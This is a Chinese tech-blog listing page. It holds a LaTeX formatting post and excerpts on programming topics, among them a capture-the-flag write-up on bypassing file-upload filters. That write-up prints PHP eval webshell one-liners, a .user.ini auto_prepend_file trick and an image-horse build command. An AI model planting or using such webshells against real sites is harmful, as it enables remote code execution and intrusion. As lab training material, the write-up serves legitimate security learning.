		目录 一、图片相关设置1、TexLive下jpg转eps文件2、插入eps文件不显示问题解决3、图片引用设置 二、表格相关设置1、表名加粗及换行设置2、表格过长或过窄问题3、表格引用设置 本文的编译环境为TexLive，使用的编译器为TexStudio 一、图片相关设置 1、TexLive下jpg转eps文件 目前，大多数使用的是CTeX下的Command Prompt窗口，运行bmeps命令即可完成转化。其实，在TexLive下也有相应的窗口，叫Tex Live command-line（可以直接在电脑搜索栏里进行搜索即可）。进入后，只要将图片放在当前的工作路径，使用bmeps -c xxx.jpg xxx.eps即可（这里的xxx指的则是你自己的图片名）。
当然，如果不知道工作路径在什么地方，利用cd命令将工作路径切换到桌面，然后进行转化。具体代码如下图所示：
2、插入eps文件不显示问题解决 完成图片格式转化后，在TeXStudio中使用elsevier模板插入图片时，发现图片始终显示空白，而且section标题也没有加粗。
解决方法：
打开TexStudio设置，将编译器设置修改为PdfLaTex即可，修改方式如下：
修改编译器前后对比（左图为XeLaTeX下，右图为PdfLaTeX）
在使用PdfLaTeX后，图片即可正常显示，并且section标题也自动被加粗。（至于为什么Xelatex编译下不能正常显示图片，我也不是很清楚，可能受模板的影响。）
注：在使用PdfLaTeX编译的时候，不能打开编译的PDF文件，否则会报错！（因为它有默认的内部PDF查看器）
3、图片引用设置 在引用图片编号时，若想将在数字编号前添加为Fig，可以在导言区添加如下命令
\newcommand{\figref}[1]{Fig.~\ref{#1}} 以后，引用图片使用\figref即可出现Fig
二、表格相关设置 1、表名加粗及换行设置 latex中表格名默认样式如下：
而elsevier投稿要求的表格样式如下：
注意两个不同的点：1是表格名加粗，2是表名单独占一行
实现方式只需在导言区添加如下命令即可：
\usepackage[font=small,labelfont=bf,labelsep=none]{caption} %加粗 \captionsetup[table]{ labelsep=newline,%换行 singlelinecheck=false,%居左 } 2、表格过长或过窄问题 通常，在latex中当表格过长时，会溢出整体文档页面。如下图所示：
解决方式：可在tabular环境前添加\resizebox{\textwidth}{!}即可解决，具体如下所示：
\resizebox{\textwidth}{!}{ \begin{tabular} .... \end{tabular} } 该条命令是将表格长度与页面适应，宽度自动调整。调整后的表格如下：
当然，表格过窄也可使用上述命令，在此不再举例说明。从上图来看，明显看出第一根线与各列列名过于拥挤，为进一步美观，我们还可调整整个表格的行间距和列间距。
\resizebox{\textwidth}{!}{ \renewcommand{\arraystretch}{1.3} %调整行间距 \tabcolsep 15pt %调整列间距 \tabsep \begin{tabular} .... \end{tabular} } 3、表格引用设置 在引用表格编号时，同样若想产生Table num样式，可在导言区添加如下命令：
\newcommand{\tabref}[1]{Table.~\ref{#1}} 以上就是本次分享的全部内容~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec63aad47f496d26154237f051c70909/" rel="bookmark">
			单链表 C&#43;&#43; 模板题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		输入样例 10 H 9 I 1 1 D 1 D 0 H 6 I 3 6 I 4 5 I 4 5 I 3 4 D 6 输出样例 6 4 6 5 这个题我使用了数组模拟链表，va数组存第i个插入数字的数值，inext数组存第i个插入的数字的下一个数字所在的下标。其中inext[0]存储第一个链表首元素所在下标。 #include&lt;bits/stdc++.h&gt; using namespace std; const int N=100000+5; int va[N]; int inext[N]; int main(){ int index=1;//下一个要插入数字的下标 inext[0]=-1;//next[0]为头指针 int m; scanf("%d",&amp;m); char c; while(m--){ cin&gt;&gt;c; int x,k; if(c=='H'){//链表头插入一个数字 scanf("%d",&amp;x); va[index]=x; inext[index]=inext[0]; inext[0]=index++; } else if(c=='D'){//删除一个数字 scanf("%d",&amp;k); int dd=inext[k]; inext[k]=inext[dd]; } else if(c=='I'){//插入一个数字 scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec63aad47f496d26154237f051c70909/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03081d574e9444a227049e5672d559de/" rel="bookmark">
			UNeXt：第一个基于卷积和MLP的快速医学图像分割网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击下方卡片，关注“CVer”公众号
AI/CV重磅干货，第一时间送达
作者：Wildeur | 已授权转载（源：知乎）编辑：CVer
https://zhuanlan.zhihu.com/p/491798644
UNeXt: MLP-based Rapid Medical Image Segmentation Network
论文：https://arxiv.org/abs/2203.04967
代码（基于PyTorch，已开源）：
https://github.com/jeya-maria-jose/UNeXt-pytorch
1. 摘要 UNet及其最新的扩展如TransUNet是近年来领先的医学图像分割方法。然而，由于这些网络参数多、计算复杂、使用速度慢，因此不能有效地用于即时应用中的快速图像分割。为此，我们提出了一种基于卷积多层感知器(MLP)的图像分割网络unext。我们设计了一种有效的UNeXt方法，即在前期采用卷积阶段和在后期采用MLP阶段。我们提出了一个标记化的MLP块，在该块中，我们有效地标记和投射卷积特征，并使用MLP来建模表示。
为了进一步提高性能，我们建议在输入mlp时shift输入的channel，以便专注于学习局部依赖性。在潜在空间中使用标记化的mlp减少了参数的数量和计算复杂度，同时能够产生更好的表示，以帮助分割。该网络还包括各级编码器和解码器之间的跳跃连接。测试结果表明，与目前最先进的医学图像分割架构相比，UNeXt的参数数量减少了72x，计算复杂度降低了68x，推理速度提高了10x，同时也获得了更好的分割性能。
2. 网络结构 2.1 网络设计: UNeXt是一个编码器-解码器体系结构，有两个阶段: 1) 卷积阶段
2) tokenized MLP阶段。
输入图像通过编码器，其中前3个块是卷积，下2个是tokenized MLP块。解码器有2个tokenized MLP块，后面跟着3个卷积块。每个编码器块减少特征分辨率2倍，每个解码器块增加特征分辨率2。跳跃连接也被应用在了编码器和解码器之间
作者减少了每个stage的通道数。
每个stage的通道数，对比标准的Unet：
UNeXt：32 64 128 160 256
UNet：64 128 256 512 1024
在这里面就减少了很多的参数量
2.2 卷积阶段 有三个conv block，每个block都有一个卷积层（传统Unet是两个）、批量归一化层和ReLU激活。我们使用的内核大小为3×3, stride为1,padding为1。编码器的conv块使用带有池窗口2×2的max-pooling层，而解码器的conv块使用双线性插值层对特征图进行上采样。我们使用双线性插值而不是转置卷积，因为转置卷积基本上是可学习的上采样，会导致产生更多可学习的参数
2.3 Shifted MLP 在shifted MLP中，在tokenize之前，我们首先移动conv features通道的轴线。这有助于MLP只关注conv特征的某些位置，从而诱导块的位置。这里的直觉与Swin transformer类似，在swin中引入基于窗口的注意，以向完全全局的模型添加更多的局域性。由于Tokenized MLP块有2个mlp，我们在一个块中跨越宽度移动特征，在另一个块中跨越高度移动特征，就像轴向注意力中一样。我们对这些特征做了h个划分，并根据指定的轴通过j个位置移动它们。这有助于我们创建随机窗口，引入沿轴线的局部性。
Shift操作 图中灰色是特征块的位置，白色是移动之后的padding。
2.4 Tokenized MLP阶段 image-20220402001733482 在Tokenized MLP块中，我们首先shift features并将它们投射到token中。为了进行token化，我们首先使用3x3conv把特征投射到E维，其中E是embadding维度(token的数量)，它是一个超参数。然后我们将这些token传递给一个shifted MLP(跨越width)。接下来，特征通过 DW-Conv传递。然后我们使用GELU激活层。然后，我们通过另一个shifted MLP(跨越height)传递特征，该mlp把特征的尺寸从H转换为了O。我们在这里使用一个残差连接，并将原始标记添加为残差。然后我们利用layer norm（LN），并将输出特征传递到下一个块。LN比BN更可取，因为它更有意义的是沿着token进行规范化，而不是在Tokenized MLP块的整个批处理中进行规范化。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/03081d574e9444a227049e5672d559de/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9c7ee3785588e68cd78dc19d9fc677d/" rel="bookmark">
			RuoYi若依打包发布与部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上一节我们已经讲过了如果搭建开发环境，那么如果代码写完了，如何打包发布。部署到生产环境呢？
《RuoYi开发实战-搭建开发环境》
https://blog.csdn.net/lxyoucan/article/details/123764953
环境 我先说一下我的环境信息：
开发环境：
操作系统：macOS BigSur 11.4
开发工具：IDEA 2021.1
后台打包 在RuoYi-Vue项目的根目录执行以下命令。
mvn clean package -Dmaven.test.skip=true 执行完成后，会生成一个Jar包，在日志中可以看出完整的路径。
或以通过以下命令启动服务测试：
java -jar ruoyi-admin.jar 前端打包 进入前端项目的主目录，然后执行：
npm run build:prod 执行完后会在dist目录生成相关的打包好的文件。
把打包好的文件上传到服务器，我部署的位置是：/home/ruoyi/projects/ruoyi-ui
localhost:/home/ruoyi/projects/ruoyi-ui# pwd /home/ruoyi/projects/ruoyi-ui localhost:/home/ruoyi/projects/ruoyi-ui# ls favicon.ico html index.html index.html.gz robots.txt static linux部署 生产环境一般都是在Linux中部署的，我这里以alpine Linux为例。其他发行版本大同小异。
安装JDK 安装JDK8。
apk add openjdk8 版本信息如下：
java -version openjdk version "1.8.0_302" OpenJDK Runtime Environment (IcedTea 3.20.0) (Alpine 8.302.08-r2) OpenJDK 64-Bit Server VM (build 25.302-b08, mixed mode) 这里需要说明一下，最好用JDK8。我一开始用JDK11虽然项目也可以成功运行，但是用户登录时获取验证码时就报错了。也许想用JDK11就要用JDK11编译代码吧。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b9c7ee3785588e68cd78dc19d9fc677d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/777d1b770a039cc7a14303e19cb5f4f9/" rel="bookmark">
			【错误记录】Ubuntu 中 ROOT 用户无法启动 Visual Studio Code 开发环境 ( 推荐在普通用户下使用 VSCode 开发环境 )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、报错信息二、解决方案 一、报错信息 在 【开发环境】Ubuntu 安装 Visual Studio Code 开发环境 ( 下载 Visual Studio Code 安装器 | Ubuntu 安装 deb 包 ) 博客中 , 在 Ubuntu 中安装了 Visual Studio Code 开发环境 , 发现出现如下问题 :
在 ROOT 用户下无法打开 " Visual Studio Code 开发环境 " ; 下面是点击了很多次 VSCode 图标 , 都无法启动软件 ;
二、解决方案 官方不推荐在 root 用户下打开 VSCode ;
网上搜索了下解决方案 :
方案一 : 使用 sudo code --user-data-dir ="/home/master/.vscode/" 命令 , 指定用户数据目录 ;方案二 : 在 ~/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/777d1b770a039cc7a14303e19cb5f4f9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a4e4df33ed3cd3c68326b5f94be694d1/" rel="bookmark">
			组合数的几种求法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、组合数的定义二、杨辉三角三、Lucas定理四、分解质因数总结 前言 在很多算法的应用中，组合数常常作为一个重要的组成部分，想要计算出组合数也有许多算法，那么，该如何在合适的地方使用合适的算法呢？
一、组合数的定义 公式： C a b C_a^b Cab​ = = = a ! / ( b ! ) ∗ ( b − a ) ! a!/(b!)*(b-a)! a!/(b!)∗(b−a)!
时间复杂度： O ( b ) O(b) O(b)
说明：一般在 a a a较大且 b b b较小时使用，代码较为简单易懂，可以搭配逆元使用。
代码(逆元为费马小定理)：
ll C(ll a,ll b){ ll up = 1,down = 1; for(int i = a,j = 1;j&lt;=b;--i,++j){ up = up * i % p; down = down * j % p; } return up * qmi(down,p-2); } 二、杨辉三角 公式： C a b C_a^b Cab​ = = = C a − 1 b C_{a-1}^b Ca−1b​ + + + C a − 1 b − 1 C_{a-1}^{b-1} Ca−1b−1​
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a4e4df33ed3cd3c68326b5f94be694d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fadc032461cbdce127fdc9386b27e564/" rel="bookmark">
			java开发环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		下载JDK 下载页面：https://www.oracle.com/java/technologies/downloads/
windows开发环境 安装jdk 新建目录: D:/dev/java
解压缩jdk到D:/dev/java
将解压缩后的目录重命名为jdk-17，jdk-后面的数字代表jdk版本号
配置环境变量
5. 键盘使用win+r组合键，输入cmd
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/edc9f0a5a5d57797bf68e37364743831/" rel="bookmark">
			Linux
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Linux 简介 Linux 是一种自由和开放源码的类 UNIX 操作系统。
Linux 英文解释为 Linux is not Unix。
Linux 是在 1991 由林纳斯·托瓦兹在赫尔辛基大学上学时创立的，主要受到 Minix 和 Unix 思想的启发。
Linux 内核最初只是由芬兰人林纳斯·托瓦兹（Linus Torvalds）在赫尔辛基大学上学时出于个人爱好而编写的。
Linux 是一套免费使用和自由传播的类 Unix 操作系统，是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统。
Linux 能运行主要的 UNIX 工具软件、应用程序和网络协议。它支持 32 位和 64 位硬件。Linux 继承了 Unix 以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。
Linux 的发行版 Linux 的发行版说简单点就是将 Linux 内核与应用软件做一个打包。
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-I5JOYx0y-1649074964299)(README/image-20220330094259608.png)]
Linux 应用领域 今天各种场合都有使用各种 Linux 发行版，从嵌入式设备到超级计算机，并且在服务器领域确定了地位，
通常服务器使用 LAMP（Linux + Apache + MySQL + PHP）或 LNMP（Linux + Nginx+ MySQL + PHP）组合。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/edc9f0a5a5d57797bf68e37364743831/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/042dc7541c991e077474a6f4b5c46271/" rel="bookmark">
			Spring注解驱动开发学习总结12：AOP原理 - @EnableAspectJAutoProxy注解作用分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring注解驱动开发学习总结12：AOP原理 - @EnableAspectJAutoProxy注解作用分析 1、@EnableAspectJAutoProxy注解的作用1.1 导入AspectJAutoProxyRegistrar类1.2 容器中注册AnnotationAwareAspectJAutoProxyCreator类1.3 小结 2、AnnotationAwareAspectJAutoProxyCreator类的使用分析2.1 继承关系分析2.2 aop关键方法分析2.3 测试理论分析2.4 小结 3、小结 在上一篇博文Spring注解驱动开发学习总结11：AOP功能使用，我们学习了AOP的基本使用，下面开始来理解下AOP功能能实现的原理。注：本文用的spring-context是4.3.12.RELEASE版本的。
1、@EnableAspectJAutoProxy注解的作用 首先要能使用AOP，需要在配置类上添加@EnableAspectJAutoProxy注解，因此首先需要来看下@EnableAspectJAutoProxy注解干了点什么事？
1.1 导入AspectJAutoProxyRegistrar类 首先查看@EnableAspectJAutoProxy注解，可以看到112行，该类上面添加了一个@Import注解，该注解导入了一个AspectJAutoProxyRegistrar类。
因此接下来需要看下，AspectJAutoProxyRegistrar这个类干了点什么事？
1.2 容器中注册AnnotationAwareAspectJAutoProxyCreator类 查看AspectJAutoProxyRegistrar类，可以看到它实现了ImportBeanDefinitionRegistrar类的registerBeanDefinitions方法，因此我们可以猜测到，它应该是要给容器中主动注册一个beanDefinition。
接着断点进入45行的registerAspectJAnnotationAutoProxyCreatorIfNecessary方法，通过方法栈可以看到，最后会进入到AopConfigUtils类的109行的registerOrEscalateApcAsRequired方法。
查看AopConfigUtils类的109行的registerOrEscalateApcAsRequired方法。
１）首先在118行，判断是否存在id为internalAutoProxyCreator的组件。由于容器刚创建，条件为false。其中：
AUTO_PROXY_CREATOR_BEAN_NAME = “org.springframework.aop.config.internalAutoProxyCreator”;
２）接下面在125行，给容器注册一个id为internalAutoProxyCreator，类型为org.springframework.aop.aspectj.annotation.AnnotationAwareAspectJAutoProxyCreator的组件。
因此可以看到，实际上就是给容器中注册了一个id为internalAutoProxyCreator，类型为.AnnotationAwareAspectJAutoProxyCreator的组件。
1.3 小结 １、在配置类上必须加@EnableAspectJAutoProxy注解，而@@EnableAspectJAutoProxy注解类上加了@Import(AspectJAutoProxyRegistrar.class)，也就是导入了一个AspectJAutoProxyRegistrar类。
２、AspectJAutoProxyRegistrar类中的registerBeanDefinitions方法，最终给容器中注册了一个id为internalAutoProxyCreator，类型为.AnnotationAwareAspectJAutoProxyCreator的组件。
2、AnnotationAwareAspectJAutoProxyCreator类的使用分析 由上一小结可以看到，配置类上加了@EnableAspectJAutoProxy注解，最终会给ioc容器注册一个类型为.AnnotationAwareAspectJAutoProxyCreator的组件。那么接下来就先分析下，注册这个组件大概有什么用？
2.1 继承关系分析 １、AnnotationAwareAspectJAutoProxyCreator类继承自AspectJAwareAdvisorAutoProxyCreator类。
public class AnnotationAwareAspectJAutoProxyCreator extends AspectJAwareAdvisorAutoProxyCreator {} ２、AspectJAwareAdvisorAutoProxyCreator类继承自AbstractAdvisorAutoProxyCreator类。
public class AspectJAwareAdvisorAutoProxyCreator extends AbstractAdvisorAutoProxyCreator {} ３、AbstractAdvisorAutoProxyCreator类继承自AbstractAutoProxyCreator类。
public abstract class AbstractAdvisorAutoProxyCreator extends AbstractAutoProxyCreator {} ４、AbstractAutoProxyCreator类实现了SmartInstantiationAwareBeanPostProcessor类、BeanFactoryAware类
public abstract class AbstractAutoProxyCreator extends ProxyProcessorSupport implements SmartInstantiationAwareBeanPostProcessor, BeanFactoryAware {} 分析：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/042dc7541c991e077474a6f4b5c46271/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97d42bc8219248afd7eb4c22807b82ad/" rel="bookmark">
			CTF-show-文件上传
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件上传 1、web1512、web1523、web1534、web1545、web1556、web1567、web1578、web1589、web15910、web16011、web16112、web162 1、web151 （1）法一：抓包改后缀
题目提示是前台校验，发现能上传图片，于是准备好的一句话木马改为png后缀上传再抓包
&lt;?php @eval($_POST['x']);?&gt;
将文件后缀修改为php再放包，可以看到文件上传成功
上传成功后蚁剑连接即可得到flag
（2）法二：禁JS
搜索about:config修改javascript.enabled为false即可
但是禁用之后无法点击"上传图片"
2、web152 提示后端校验，于是上上传准备好的一句话木马（png）上传抓包，修改后缀即可
3、web153 .user.ini配置文件
From：https://blog.csdn.net/lleo1/article/details/117263108
首先抓包改后缀无法实行，查看数据包，是Nginx于是考虑.user.ini.（.htaccess是Apache的）
先上传.user.ini.png
第一行为GIF的文件头
auto_prepend_file：在加载第一个PHP代码之前先行加载该配置所指示的PHP文件
auto_append_file：在每个PHP页面执行完成后所要执行的代码
抓包后删除png后缀
再上传1.png的图片马
copy 12.png /b + 1.php /a 1.png
上传后访问/upload/index若有回显则说明执行了php木马上传成功
用蚁剑连接/upload/index即可得到flag
.user.ini配置文件详情： From：https://www.jianshu.com/p/c2ed6b05c964
原理：
php.ini是php的核心配置文件，在php启动时被读取。.user.ini实际上是一个可由用户自定义的php.ini（除PHP_INI_SYSTEM外的模式都可以设置）
.user.ini为一个动态加载的ini文件，修改后，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒）即可被重新加载
漏洞利用：
若网站不允许上传php文件，可以先上传.user.ini再上传一个图片马，再进行getshell，前提是.user.ini的文件下需要有正常的PHP文件
范围比.htaccess更广，nginx/apache/IIS只要是以fastcgi运行的php都可以用此方法
4、web154 From：https://blog.csdn.net/miuzzx/article/details/109537262
短标签绕过
&lt;? echo '123';?&gt; //开启配置参数short_open_tags=on &lt;?=(表达式)?&gt; //等价于 &lt;?php echo(表达式)?&gt; //无需开启参数设置 &lt;% echo '123';%&gt; //7.0以下开启配置参数asp_tags=on &lt;script language="php"&gt;echo '123';&lt;/script&gt; //7.0以下使用 1.php文件 &lt;?=eval($_POST['x']);?&gt; .user.ini文件 GIF89a auto_prepend_file=1.png 1.png文件 copy 2.png /b + 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97d42bc8219248afd7eb4c22807b82ad/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70dae2b89187905194d3c5dfa29477e2/" rel="bookmark">
			蓝桥杯 含2天数 python组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述 本题为填空题，只需要算出结果后，在代码中使用输出语句将所填结果输出即可。
小蓝特别喜欢 2，今年是公元 2020 年，他特别高兴，因为每天日历上都可以看到 2。
如果日历中只显示年月日，请问从公元 1900 年 1 月 1 日到公元 9999 年 12 月 31 日，一共有多少天日历上包含 2。即有多少天中年月日的数位中包含数字 2。
解答：
使用内置函数datetime即可轻松解决，但datetime的年份最大值只能到9999，所以在写循环时要着重注意这一点。
from datetime import *
# 请在此输入您的代码
start = date(1900,1,1) #起始日期
end = date(9999,12,31) #终止日期
s = timedelta(days=1) #日期递增一天
count=0
while start&lt;end: #确定循环条件，因为如果是end+1，循环就会报错，则这里只循环到end-1的那个日期，而且end这一天是包含2这个数字的，所以在输出那里加一即可
if '2' in str(start): #如果包含2这个数字，count+1
count += 1
start += s
print(count+1) #1是end这一天包含2数字，前面循环没有判断end这一个日期，所以手动添加1
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d8022345811a65a4ae5537769d00f9d/" rel="bookmark">
			华为[ENSP]AAA基本实验配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		想了解AAA概念的朋友，请移步我的这一篇文章：
https://blog.csdn.net/weixin_62594100/article/details/123945539https://blog.csdn.net/weixin_62594100/article/details/123945539
AAA基本实验拓扑图如下所示：
实验要求：在路由器R1上Telnet路由器R3，使用AAA本地认证方式。
配置AAA的基本步骤如下：
（1）完成基本配置
1.配置路由器R1
2.配置路由器R2
3.配置路由器R3
（2） 完成直连网络测试
[R1]ping 12.1.1.2
[R2]ping 12.1.1.1 [R2]ping 23.1.1.2
[R3]ping 23.1.1.1
(3)配置路由使全网互通
1.在路由器R1、R2、R3上运行OSPF，区域为area 0。
2.在路由器上访问R3，测试全网的连通性，全网配置测试结果如下
（4）配置AAA认证
1.在路由器R3上定义认证和授权方案和方式
2.通过display this 命令查看认证和授权方案和方式，AAA配置结果如图
由图可知，认证和授权方式为默认本地认证和授权。 3.在路由器R3上配置本地用户及登陆方式
在这里我们会发现无法直接将权限设置为15，详情解释请看我的另一篇文章 https://blog.csdn.net/weixin_62594100/article/details/123855183https://blog.csdn.net/weixin_62594100/article/details/123855183
事实上，不用把权限设置为15也能完成AAA认证操作，设不设置其实就是权限的高低问题 。
有想要了解华为ENSP用户权限的朋友，可以移步我的另一篇文章。
https://blog.csdn.net/weixin_62594100/article/details/123870738https://blog.csdn.net/weixin_62594100/article/details/123870738
4.路由器R3在VTY线路上调用AAA认证
（5） 完成测试
1.在路由器R1上Telnet路由器R3，结果如下图，由图可知，网络管理协议测试成功。
2.在路由器R3上检查登录方式，使用display users 命令查看，并查看AAA认证方式的用户登录结果。
display users命令输出信息描述 项目
描述
+
当前用户所在的用户界面
User-Intf
第一列数字是用户界面的绝对编号，第二列数字是用户界面的相对编号
Delay
表明用户自最近一次输入到现在的时间间隔，单位是秒
Type
连接类型： Console类型Telnet类型SSH类型Web类型 Network Address
显示起始连接位置
Username
显示使用该用户界面的用户名，即该登录用户的用户名，未指定用户名时此项显示为Unspecified
AuthenStatus
标识是否验证通过
AuthorcmdFlag
命令行授权标志
在本图中，VTY前面的“+”号表明采用Console端口直接登录方式。
在下图中，将R1telnetR3的登陆结果显示出来
可以发现，VTY前面的“+”号移到了下方，说明我们此时用的是远程登录方式。
总结 本实验成功的验明了AAA本地认证方式，表明了该方式可使得网管更加有效地管理设备、控制安全登录并赋予用户不同的权限。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d93a1dc0817309b2ac7aa78715da0790/" rel="bookmark">
			java 接口是否继承 Object类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在c++中的多继承，造成了一定程度的冗余，例如，基类B和C继承自基类A，现在有一个基类D，继承自B和C，形成了一个菱形的继承关系，当创建一个D的实例时，会同时创建两个A类的构造器，这不仅在使用上要进行区分，还对内存造成了一定量的浪费。
现在我们回到java，假如有一个接口Inter，一个基类A（继承Object），这时有一个基类B继承基类A，同时实现接口Inter，如果说interface继承自Object类，那么又会出现在c++上的多继承冗余问题，这违背了java单继承的初衷，所以我认为是没有继承Object类的。
在代码方面可以这样测试一下。
System.out.println(Solution05.class.getSuperclass());//Object System.out.println(MyInterface.class.getSuperclass());//null 感谢热心网友提出质问，我对代码进行了修改。（2022.4.4）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2ae3b22a687c4f7c609262a54cff2cf/" rel="bookmark">
			【Android】使用ConstraintLayout满足占满余下部分
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 解决思路 核心代码
android:layout_width="0dp" android:layout_height="0dp" 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50990ab7909336639a2ddb1c2309180e/" rel="bookmark">
			Element-ui的分页使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		el-pagination 是element分页的标签
&lt; el-pagination
background
@current-change="handleCurrentChange"
:current-page.sync="dataForm.Page" :page-sizes="[10, 20, 30, 50, 100, 200, 400]"
:page-size="dataForm.PageSize" @size-change="handleSizeChange"
layout="total, sizes, prev, pager, next, jumper" :total="total"&gt;
&lt;/el-pagination&gt;
// dataForm:去请求后端接口时候需要传递的参数，dataForm.Page:代表第多少页，dataForm.PageSize: 代表一页多少条数据
// background: 添加背景颜色
// @current-change: currentPage 改变时会触发,也就是切换分页时会触发
// :page-sizes:一页多少条数据
// @size-change: pageSize 改变时会触发,也就是切换多少条时会触发
handleCurrentChange(val) {
this.dataForm.Page = val
this.getOlderInfo() // 调后端获取接口
},
handleSizeChange(val) {
this.dataForm.Page = 1
this.dataForm.PageSize = val
this.getOlderInfo() // 调后端获取接口
},
大家复制粘贴即可使用，需要修改的就是后端接口和后端接口的参数即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27fb328c683e13f987994c8910aa777a/" rel="bookmark">
			Vmware中桥接无法获取IP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vmware设置虚拟操作系统网卡为桥接模式后，本应该和本地网卡获取到同一网段的IP的，但现在突然无法获取到IP，原因是什么呢？
经过查看，发现Vmware中的网络编辑器中的桥接网卡桥接到了一个虚拟网卡上，更改到物理网卡后，虚拟机中的操作系统就获取到了地址。操作如下：
1、点【编辑】 -- 【虚拟网络编辑器】(图1) -- 【更改设置】
图1：
2、选中VMnet0，类型为桥接模式的那个卡，在已桥接至后边，选择你的物理网卡（图2）
图2：
Ok！Enjoy！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/92b95c3b8440d8a4ba1f6f88c396b181/" rel="bookmark">
			mybatis-plus自动生成代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一步：引入依赖
&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;/dependency&gt; 第二步：idea连接数据库
第三步：自动生成代码
右击要自动生成的表，点击MybatisX-Generator
做如下选择
点击OK
第四步：效果展示
第五步：测试
controller类：
package com.example.demo.controller; import com.example.demo.service.UserService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController @RequestMapping("/user") public class UserController { @Autowired UserService userService; @GetMapping("/index") public Object index(){ return userService.getById(1); } } 浏览器访问：http://localhost:8090/user/index
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e17ed53ab6aca0119465a27bcdbe09f1/" rel="bookmark">
			【Java SE】继承；组合；向上转型；动态绑定；方法重写；静态绑定；多态；抽象类；接口；
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		面向对象编程
文章目录 1. 包1.1 导入包中的类1.2 静态导入1.3 将类放到包中1.4 包的访问权限控制1.5 常见的系统包 2. 继承2.1 语法规则2.2 protected 关键字2.3 final 关键字 3. 组合4. 多态4.1 向上转型4.2 动态绑定4.3 方法重写4.4 静态绑定4.5 向下转型4.6 super关键字4.7 理解多态 5. 抽象类6. 接口6.1 语法规则6.2 实现多个接口6.3 接口的使用实例6.4 接口间的继承 1. 包 包时组织类的一种方式
使用包的主要目的是保证类的唯一性
1.1 导入包中的类 Java中提供了很多现成的类供我们使用，例如：可以使用java.util.Data 这种方式引入java.util这个包中的Data类
